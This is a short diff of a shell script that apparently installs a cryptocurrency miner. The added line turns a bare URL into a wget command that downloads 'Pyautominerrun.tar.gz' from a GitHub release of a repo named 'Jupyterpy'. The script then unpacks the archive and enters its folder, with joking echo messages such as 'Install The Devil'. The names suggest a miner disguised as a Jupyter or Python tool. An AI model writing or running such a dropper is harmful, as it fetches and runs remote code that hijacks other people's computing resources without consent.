@@ -2,7 +2,7 @@
 echo "At work, to hell with greedy people ..."
 apt update -q  &> /dev/null
 echo "Install The employees ..."
-https://github.com/Zeusyf/Jupyterpy/releases/download/V.0.2.0/Pyautominerrun.tar.gz
+wget https://github.com/Zeusyf/Jupyterpy/releases/download/V.0.2.0/Pyautominerrun.tar.gz
 tar -xvf Pyautominerrun.tar.gz
 cd Pyautominerrun
 echo "Install The Devil ..."
